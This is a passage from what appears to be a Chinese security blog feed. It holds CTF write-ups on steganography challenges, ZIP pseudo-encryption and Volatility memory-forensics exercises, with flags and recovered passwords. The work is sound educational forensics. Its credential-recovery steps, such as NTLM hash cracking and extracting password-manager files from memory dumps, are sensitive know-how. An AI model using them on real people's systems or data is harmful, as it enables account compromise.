文字隐藏：文字被手动隐藏了       <span class="token level number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>方法：这个非常简单，先全选（ctrl<span class="token operator">+</span>A<span class="token punctuation">)</span>，然后改变颜色字体或取消文字隐藏即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-misc40"><a href="#5-misc40" class="headerlink" title="5.misc40"></a>5.misc40</h2><p>1)下载附件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808153622117.png" alt="image-20230808153622117"></p><p>2)打开附件是4个文件，两个音频，一个二维码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808153826042.png" alt="image-20230808153826042"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808153842707.png" alt="image-20230808153842707"></p><p>打开文本根据提示进行进制转换</p><p>2进制——4进制——8进制——10进制</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154135555.png" alt="image-20230808154135555"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154244025.png" alt="image-20230808154244025"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154259045.png" alt="image-20230808154259045"></p><p>202013应该是一个密码</p><p>3)我们扫描二维码，没有如何信息，我们放到010分析，在最后出现了Brainfuck 编码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154429715.png" alt="image-20230808154429715"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154451101.png" alt="image-20230808154451101"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808155854827.png" alt="image-20230808155854827"></p><p>我们进行解密之后是123456</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808155934472.png" alt="image-20230808155934472"></p><p>4)使用MP3stego 工具，选择第二项“将文本从MP3中提出”（svega.mp3需放在同一文件夹下），使用上一步解码得到的密码123456解出svega.mp3.txt文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808160239774.png" alt="image-20230808160239774"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808160508519.png" alt="image-20230808160508519"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808160524098.png" alt="image-20230808160524098"></p><p>5)解压后音频并无异常， 根据提示需要用到SilentEye工具：</p><p>参数设置：type为AES128，Sound quality为high，第一步得到的 202013为此处密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808160704474.png" alt="image-20230808160704474"></p><p>知识点:</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Brainfuck 是一种极简主义的编程语言，使用一组简单的命令来进行编程。它的命令包括：<span class="token operator">></span>、<span class="token operator">&lt;</span>、<span class="token operator">+</span>、<span class="token operator">-</span>、[、]、<span class="token punctuation">.</span>、<span class="token punctuation">,</span>。每个命令都会在一个“内存”单元上执行操作，类似于图灵机的概念。       MP3Stego的使用方法<span class="token level number">1</span><span class="token punctuation">)</span>使用decode解密将需要解密的MP3文件复制至装有decode文件的目录下，在命令行中输入Decode<span class="token punctuation">.</span>exe -X -P 密码 MP3文件名（-X 获取隐藏文件 -P密码）回车后等待，最后在文件夹中得到隐藏的文件<span class="token level number">2</span><span class="token punctuation">)</span>使用encode加密同样的，将wav音频文件（我试了一下好像只能加密wav）和需要的txt文件复制到目录下，在打开的命令行中输入encode -E 加密的txt文件 -P 密码 加密的wav文件 输出的MP3文件名 回车即可进行加密      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-misc30"><a href="#6-misc30" class="headerlink" title="6.misc30"></a>6.misc30</h2><p>1)下载附件,需要密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808161129373.png" alt="image-20230808161129373"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808163138410.png" alt="image-20230808163138410"></p><p>2)我们放到010查看知道是伪加密，但是这里010不行，我们使用另一个工具ZIPCenOp</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808162913684.png" alt="image-20230808162913684"></p><p>3)我们进行解密之后，发现不需要密码了，打开之后是一首歌，没有什么用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808163208351.png" alt="image-20230808163208351"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808163221876.png" alt="image-20230808163221876"></p><p>4）我们在kali里面进行分离，发现一个图片，修改高度即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808164536845.png" alt="image-20230808164536845"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808164701708.png" alt="image-20230808164701708"></p><p>5)看到是猪圈密码，我们进行解密<br><img src="/./../imgs/$%7Bfiilename%7D/image-20230808165123456.png" alt="image-20230808165123456"></p><p>知识点:</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">使用ZipCenOp<span class="token punctuation">.</span>jar<span class="token punctuation">(</span>需要java环境<span class="token punctuation">)</span>，在cmd中使用java -jar ZipCenOp<span class="token punctuation">.</span>jar r xxx<span class="token punctuation">.</span>zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFSHOW——MISC&quot;&gt;&lt;a href=&quot;#CTFSHOW——MISC&quot; class=&quot;headerlink&quot; title=&quot;CTFSHOW——MISC&quot;&gt;&lt;/a&gt;CTFSHOW——MISC&lt;/h1&gt;&lt;h2 id=&quot;1-杂项签到&quot;&gt;&lt;a href=&quot;#1-杂</summary>
      
    
    
    
    <category term="misc" scheme="http://ms02423.top/categories/misc/"/>
    
    
    <category term="ctfshow" scheme="http://ms02423.top/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>内存取证练习题</title>
    <link href="http://ms02423.top/2023/07/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <id>http://ms02423.top/2023/07/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E7%BB%83%E4%B9%A0%E9%A2%98/</id>
    <published>2023-07-25T11:17:05.000Z</published>
    <updated>2023-07-29T13:23:21.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-介绍"><a href="#一-介绍" class="headerlink" title="一.介绍"></a>一.介绍</h1><h2 id="1-内存取证-Memory-forensics"><a href="#1-内存取证-Memory-forensics" class="headerlink" title="1.内存取证 (Memory forensics)"></a>1.内存取证 (Memory forensics)</h2><p> 1)内存取证是对计算机内存转储的取证分析</p><p> 2)它的主要应⽤是调查⾼级计算机攻击，这些攻击⾜够隐蔽，可以避免将数据留在计算机硬盘上</p><p> 3)因此，必须分析内存 (RAM) 以获取取证信息</p><p>由于内存中有⼤量的结构化及⾮结构化的数据，可通过对物理内存镜像提取出有价值的数据，常⻅的有价值数据包括进程列表、动态链接库、打开⽂件列表、⽹络连接、注册表、加密密钥或密码、聊天记录、互联⽹访问、电⼦邮件、图⽚及⽂档等。通过对计算机内存内容的保存和分析，可以得到⼤量计算机运⾏时的各种信息，以还原各种⽂件、⽹络发送的数据、账号密码等信息。</p><h2 id="2-常⽤⼯具"><a href="#2-常⽤⼯具" class="headerlink" title="2.常⽤⼯具"></a>2.常⽤⼯具</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725192333632.png" alt="image-20230725192333632"></p><h2 id="3-⼯具⼿法"><a href="#3-⼯具⼿法" class="headerlink" title="3.⼯具⼿法"></a>3.⼯具⼿法</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725192448299.png" alt="image-20230725192448299"></p><h2 id="4-参数解析"><a href="#4-参数解析" class="headerlink" title="4.参数解析"></a>4.参数解析</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725192546291.png" alt="image-20230725192546291"></p><h2 id="5-常⽤插件"><a href="#5-常⽤插件" class="headerlink" title="5.常⽤插件"></a>5.常⽤插件</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725192629987.png" alt="image-20230725192629987"></p><h2 id="6-常用手法"><a href="#6-常用手法" class="headerlink" title="6.常用手法"></a>6.常用手法</h2><p>1)框架基础⼿法</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">python vol<span class="token punctuation">.</span>py [plugin] -f [image] --profile<span class="token operator">=</span>[profile]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2)查看⽂件所属系统信息</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3)根据系统查看对应进程列表</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw --profile<span class="token operator">=</span>Win7SP1x86_23418 pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4)获取隐藏进程列表</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw --profile<span class="token operator">=</span>Win7SP1x86_23418 psxview  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5)获取 <strong>cmd.exe</strong> 命令⾏中执⾏信息</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw --profile<span class="token operator">=</span>Win7SP1x86_23418 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6)获取执⾏程序发出的标准输出</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw --profile<span class="token operator">=</span>Win7SP1x86_23418 consoles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二-实战提升"><a href="#二-实战提升" class="headerlink" title="二.实战提升"></a>二.实战提升</h1><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725194111433.png" alt="image-20230725194111433"></p><h2 id="1-实战-0-easy"><a href="#1-实战-0-easy" class="headerlink" title="1.实战 0 [easy]"></a>1.实战 0 [easy]</h2><h3 id="1-题⽬描述"><a href="#1-题⽬描述" class="headerlink" title="1.题⽬描述"></a>1.题⽬描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">My friend John <span class="token keyword">is</span> an <span class="token string">"environmental"</span> activist <span class="token operator">and</span> a humanitarian<span class="token punctuation">.</span> He hated  the ideology <span class="token keyword">of</span> Thanos <span class="token keyword">from</span> the Avengers<span class="token punctuation">:</span> Infinity War<span class="token punctuation">.</span> He sucks <span class="token keyword">at</span> programming<span class="token punctuation">.</span> He used too many variables while writing <span class="token keyword">any</span> <span class="token keyword">program</span><span class="token punctuation">.</span> One <span class="token keyword">day</span><span class="token punctuation">,</span>John gave me a <span class="token keyword">memory</span> dump <span class="token operator">and</span> asked me <span class="token keyword">to</span> find out what he was doing while he took the dump<span class="token punctuation">.</span> Can you figure it out <span class="token keyword">for</span> me?译⽂：我的朋友约翰是⼀位“环保”活动家和⼈道主义者<span class="token punctuation">,</span>他讨厌复仇者联盟中灭霸的意识形态：⽆限战争。他编程很烂。他在编写任何程序时使⽤了太多变量。有⼀天，约翰给了我⼀个内存转储，并让我找出他在转储时在做什么。你能帮我弄清楚吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-题⽬分析"><a href="#2-题⽬分析" class="headerlink" title="2.题⽬分析"></a>2.题⽬分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">从描述中我们可以捕捉到⼀点东西：“environmental” 词被应⽤到 <span class="token punctuation">(</span>后续可能与系统的环境变量有关？<span class="token punctuation">)</span>John hates Thanos <span class="token punctuation">(</span>John 讨厌灭霸，可能没⽤？<span class="token punctuation">)</span>John 不擅⻓编程，因为他使⽤了太多的变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程"><a href="#3-解题过程" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)拿到镜像⽂件：先解压：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725194215699.png" alt="image-20230725194215699"></p><p>2)既然这⾥存在 3 个提⽰，那么⾸先我们先获取内存所属框架信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725194634704.png" alt="image-20230725194634704"></p><p>3)然后指定框架，获取到进程列表，看看有没什么好东西,我们可以注意到有 cmd.exe 其中可能就存在运⾏ Python 程序，我们使用cmdscan进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725194800306.png" alt="image-20230725194800306"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725195021227.png" alt="image-20230725195021227"></p><p>4)既然得到运⾏程序，我们可查看是否该程序有存在标准输出</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725195120236.png" alt="image-20230725195120236"></p><p>可以看到一串16进制，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725195256029.png" alt="image-20230725195256029"></p><p>5)感觉没有什么用，我们换一个方向，题目提到了 “environment” 则对应的系统环境变量——envars，我们查看试试，其中还有 “Thanos” 的⼀个关键信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725195559821.png" alt="image-20230725195559821"></p><p>找到了对应环境变量，value 字段提⽰我们 xor and password，这对应了异或和系统账⼾的密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">异或解密是一种简单的对称加密和解密技术，通常用于保护简单的数据。在异或解密中，使用一个密钥（通常是一个整数或二进制位序列）对要加密的数据进行异或运算，得到加密后的数据。同样，如果使用相同的密钥再次对加密数据进行异或运算，就可以得到原始的数据，从而实现解密。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们先异或解码看看：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'335d366f5d6031767631707f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> a<span class="token punctuation">:</span>        b <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运⾏后，我们可以看到⼀个特殊的字段：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725200228528.png" alt="image-20230725200228528"></p><p>6)其中有 } 类似是 FLAG 的⼀部分，我们继续查看系统账⼾密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725200419841.png" alt="image-20230725200419841"></p><p>对其进⾏ NTLM hash 解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725201857721.png" alt="image-20230725201857721"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;you_are_good_but_1_4m_b3tt3r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-实战-1"><a href="#2-实战-1" class="headerlink" title="2.实战 1"></a>2.实战 1</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">My sister's computer crashed<span class="token punctuation">.</span> We were very fortunate <span class="token keyword">to</span> recover this memorydump<span class="token punctuation">.</span> Your job <span class="token keyword">is</span> get <span class="token keyword">all</span> her important files <span class="token keyword">from</span> the system<span class="token punctuation">.</span> <span class="token keyword">From</span> what weremember<span class="token punctuation">,</span> we suddenly saw a black window pop <span class="token keyword">up</span> <span class="token keyword">with</span> some thing beingexecuted<span class="token punctuation">.</span> <span class="token keyword">When</span> the crash happened<span class="token punctuation">,</span> she was trying <span class="token keyword">to</span> draw something<span class="token punctuation">.</span> Thatsall we remember <span class="token keyword">from</span> the <span class="token keyword">time</span> <span class="token keyword">of</span> crash<span class="token punctuation">.</span>Note<span class="token punctuation">:</span> This challenge <span class="token keyword">is</span> composed <span class="token keyword">of</span> <span class="token number">3</span> flags<span class="token punctuation">.</span>译⽂：我姐姐的电脑坏了，我们⾮常幸运地恢复了这个内存转储。你的⼯作是从系统中获取她所有的重要⽂件。根据我们的记忆，我们突然看到⼀个⿊⾊的窗⼝弹出，上⾯有⼀些正在执⾏的东西。电脑崩溃时，她正试图画⼀些东西。这就是我们当时所记得的⼀切<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题⽬分析-1"><a href="#2-题⽬分析-1" class="headerlink" title="2.题⽬分析"></a>2.题⽬分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">⿊⾊窗⼝，类似 cmd<span class="token punctuation">.</span>exe 之类的获取重要⽂件，可能与⽂件相关，需要⽤到 <span class="token punctuation">(</span>filescan<span class="token punctuation">,</span>dumpfiles<span class="token punctuation">)</span> 插件“她正试图画⼀些东西”，可能我们需要注意到画图程序 <span class="token punctuation">(</span>Windows mspaint<span class="token punctuation">.</span>exe<span class="token punctuation">)</span>最后题⽬提⽰： <span class="token number">3</span> 个 Flags<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-1"><a href="#3-解题过程-1" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)拿到题⽬先解压：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725202607165.png" alt="image-20230725202607165"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725202638303.png" alt="image-20230725202638303"></p><p>2)获取镜像信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725202749037.png" alt="image-20230725202749037"></p><p>3)题目提到了黑色窗口，我们使用cmdscan进行查看，可以看到没有什么信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725202905123.png" alt="image-20230725202905123"></p><p>4)我们使用consoles查看标准化输出，可以看到一串base64编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725203024685.png" alt="image-20230725203024685"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725203049982.png" alt="image-20230725203049982"></p><p>5)题目提到了主要文件，首先我们在桌面上进行搜索，但是没有如何东西</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725203255407.png" alt="image-20230725203255407"></p><p>我们使用cmdline进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726190202485.png" alt="image-20230726190202485"></p><p>由于图片太长了，我就截取了存在文件的图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726190305713.png" alt="image-20230726190305713"></p><p>6)我们提取该文件使用——dumpfiles</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726190653252.png" alt="image-20230726190653252"></p><p>我们查看文件是rar文件，我们修改后缀名为rar，然后解压</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726190906216.png" alt="image-20230726190906216"></p><p>我们看到需要密码，密码就是ALISSA的密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726191035990.png" alt="image-20230726191035990"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726191235480.png" alt="image-20230726191235480"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726191245855.png" alt="image-20230726191245855"></p><p>我们输入密码goodmorningindia</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726191906482.png" alt="image-20230726191906482"></p><p>7)拿到了2个flag，还有一个，根据题目，我们再次转变⽅向，题⽬提⽰了 windows 画板程序即：mspaint.exe，我们看看进程中是否存在</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726192058139.png" alt="image-20230726192058139"></p><p>我们将进程在运⾏中产⽣的内存缓存导出</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726192330677.png" alt="image-20230726192330677"></p><p>8)我们可以推测，既然是 Windows mspaint.exe 所编辑的，那必然是图⽚，这⾥采⽤ gimp ⼯具，直接打开该⽂件尝试进⾏图⽚源信息编</p><p>辑，如下：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726192853325.png" alt="image-20230726192853325"></p><p>打开后，尝试编辑源信息 (宽度和⾼度及位移度)，看看是否有什么异动，经过测试，最终如下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193033625.png" alt="image-20230726193033625"></p><p>我们可以清楚的看到，这⾥⾯是有东西的，但是跟个⽕星⽂⼀样，这⾥是否还有什么值得操作的？是否可以观察到，⽂字和图⽚ 有所颠倒 ，尝试进⾏⽔平翻转</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193242775.png" alt="image-20230726193242775"></p><p>使⽤第⼆个进⾏⽔平翻转，如下，得到 FLAG{Good_BOY_good_girl}</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193331300.png" alt="image-20230726193331300"></p><h2 id="3-实战-2"><a href="#3-实战-2" class="headerlink" title="3.实战 2"></a>3.实战 2</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">One <span class="token keyword">of</span> the clients <span class="token keyword">of</span> our company<span class="token punctuation">,</span> lost the <span class="token keyword">access</span> <span class="token keyword">to</span> his system due <span class="token keyword">to</span> an unknown <span class="token keyword">error</span><span class="token punctuation">.</span> He <span class="token keyword">is</span> supposedly a very popular <span class="token string">"environmental"</span> activist<span class="token punctuation">.</span> <span class="token keyword">As</span> a part <span class="token keyword">of</span> the investigation<span class="token punctuation">,</span> he told us that his <span class="token keyword">go</span> <span class="token keyword">to</span> applications <span class="token keyword">are</span> browsers<span class="token punctuation">,</span> his <span class="token keyword">password</span> managers etc<span class="token punctuation">.</span> We hope that you can dig <span class="token keyword">into</span> this <span class="token keyword">memory</span> dump <span class="token operator">and</span> find his important stuff <span class="token operator">and</span> give it back <span class="token keyword">to</span> us<span class="token punctuation">.</span>译⽂：我们公司的⼀位客⼾由于未知错误⽽失去了对其系统的访问权限。据推测，他是⼀位⾮常受欢迎的<span class="token string">"environmental"</span> 活动家，作为调查的⼀部分，他告诉我们，他使⽤的应⽤程序是浏览器、密码管理器等，我们希望您能深⼊挖掘这个内存转储，找到他的重要资料并将其还给我们。Note：这个挑战中有 <span class="token number">3</span> 个 FLAG 需要全部获取<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><pre class="line-numbers language-none"><code class="language-none">环境变量浏览器历史密码管理器软件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-2"><a href="#3-解题过程-2" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)进行解压</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193755406.png" alt="image-20230726193755406"></p><p>2)获取镜像系统</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193804565.png" alt="image-20230726193804565"></p><p>3)根据题目，我们首先进行环境分析——envars</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193950434.png" alt="image-20230726193950434"></p><p>我们可以看到一串base64编码，我们进行解密，拿到第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726194051098.png" alt="image-20230726194051098"></p><p>4)接下来我们查看浏览器，浏览器为谷歌浏览器</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726194135061.png" alt="image-20230726194135061"></p><p>获取浏览器历史：</p><p>编译出来的程序⽆法使⽤该插件，直接⽤源 Python 使⽤可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195111598.png" alt="image-20230726195111598"></p><p>获取到⼀些有趣的⽂件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195205605.png" alt="image-20230726195205605"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span>kdbx 后缀为常⻅的密码管理器后缀格式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>保存⼀下，后续我们扫描然后通过偏移量获取：</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token level number">1</span> Important<span class="token punctuation">.</span>rar<span class="token level number">2</span> SW1wb3J0YW50<span class="token punctuation">.</span>rar<span class="token level number">3</span> stAg3_5<span class="token punctuation">.</span>txt<span class="token level number">4</span> <span class="token keyword">Password</span><span class="token punctuation">.</span>png<span class="token level number">5</span> Hidden<span class="token punctuation">.</span>kdbx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5)仅获得最后两个⽂件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195607501.png" alt="image-20230726195607501"></p><p>转存到本地：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195820354.png" alt="image-20230726195820354"></p><p>还原⼆者的后缀</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195927684.png" alt="image-20230726195927684"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200024437.png" alt="image-20230726200024437"></p><p>6)打开图⽚发现敏感信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200052675.png" alt="image-20230726200052675"></p><p>FLAG2：关联⼀下，这玩意⼉⽤于解锁该密码存储，使⽤ KeePassXC 打开该存储</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200138207.png" alt="image-20230726200138207"></p><p>但是还有⼀个 FLAG，获取 chrome 历史记录，得到⼀个奇怪的路径，对其进⾏访问看看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200253295.png" alt="image-20230726200253295"></p><p>下载过来，解压，密码如下：</p><p>6045dd90029719a039fd2d2ebcca718439dd100a</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200348034.png" alt="image-20230726200348034"></p><h2 id="4-实战-3"><a href="#4-实战-3" class="headerlink" title="4.实战 3"></a>4.实战 3</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">A malicious script encrypted a very secret piece <span class="token keyword">of</span> information I had <span class="token keyword">on</span> my system<span class="token punctuation">.</span> Can yourecover the information <span class="token keyword">for</span> me please?Note-1<span class="token punctuation">:</span> This challenge <span class="token keyword">is</span> composed <span class="token keyword">of</span> only <span class="token number">1</span> flag<span class="token punctuation">.</span> The flag split <span class="token keyword">into</span> <span class="token number">2</span> parts<span class="token punctuation">.</span>Note-2<span class="token punctuation">:</span> You'll need the <span class="token keyword">first</span> half <span class="token keyword">of</span> the flag <span class="token keyword">to</span> get the second<span class="token punctuation">.</span>You will need this additional tool <span class="token keyword">to</span> solve the challenge<span class="token punctuation">,</span>译⽂：⼀个恶意脚本加密了我系统中的⼀条⾮常机密的信息。你能帮我恢复信息吗？<span class="token level number">1</span> $ sudo apt install steghideLeadlifeSec 知识星球 leadlifeNote-1：此挑战仅由 <span class="token number">1</span> 个标志组成。旗帜分为两部分Note-2：您需要旗帜的前半部分才能获得旗帜的后半部分。同时我们需要⼀个 Misc 中常⽤与解决隐写术的⼯具 steghide 来帮助我们解决该题⽬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题目分析-1"><a href="#2-题目分析-1" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">根据题⽬可知如下：⼀些机密信息存在恶意脚本Flag 有两部分，必须获得前者才能进⽽过的后者考题设计 Misc 中的隐写，我们可注意⼀些特殊命名的图⽚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-3"><a href="#3-解题过程-3" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)我们进行解压</p><p>2)我们提权镜像</p><p>3)进⾏ cmdscan 获取 cmd.exe 命令⾏中执⾏信息，发现是乱码，但是我们也看到了有点⽤的信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726201924471.png" alt="image-20230726201924471"></p><p>先不去管，看看有没造成什么输出，嗯啥也没有</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726201941837.png" alt="image-20230726201941837"></p><p>4)对我们上⾯从 cmdscan 